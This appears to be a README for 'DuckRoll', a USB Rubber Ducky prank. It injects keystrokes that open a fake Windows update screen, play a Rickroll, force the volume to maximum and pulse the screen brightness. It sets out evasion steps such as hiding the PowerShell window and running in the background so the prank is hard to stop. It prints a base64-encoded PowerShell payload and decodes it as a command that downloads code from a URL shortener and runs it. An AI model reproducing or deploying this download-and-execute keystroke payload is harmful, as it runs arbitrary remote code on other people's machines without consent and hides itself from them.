# DuckRoll

A script that opens [fakeUpdate](http://fakeupdate.net/win10u/) in full screen and plays the Rickroll song, as well as some other small pranks: 

 - Constantly setting the volume to 100% to prevent the user from turning it down
 - Pulsing the brightness from 100% to 0% and viceversa

The script also does some things to be as undetectable, yet effective as possible: 

 - It hides the Powershell window right after opening it so user doesn't suspect anything 

 - It uses an external Powershell script to run the prank, so the ducky can be removed as quickly as possible

 - Everything that the ducky itself types on the host device is simple ascii letters and numbers, so different keyboard layouts should not break things

 - It runs in the background so the only way to stop it is to kill Powershell through Task Manager, which most people won't know/think of doing

 - It always downloads the latest script from the internet, so modifications to the script do not require reflashing the ducky itself

### Payload explanation

the payload itself: `powershell /e aQBlAHgAKABpAHcAcgAgAC0AdQBzAGUAYgAgAGIAaQB0AC4AZABvAC8AZQBTAEwAZwBmACkA`

1. base64 encoding: that command is equivalent to `powershell iex(iwr -useb bit.do/eSLgf)`; however, the unencoded version contains many non-alphanumeric characters that would break if the host's keyboard layout is different from the configured layout on the ducky.
    - the encoded payload contains *one* special character (`/`), but on other, non-US keyboard layouts that key maps to `-`, which is also a valid powershell command, so this was chosen purposefully :)

2. the decoded command itself is then equivalent to `powershell Invoke-Expression(Invoke-Webrequest -usebasicparsing bit.do/eSLgf)`... and at this point you may have already figured out what that's doing
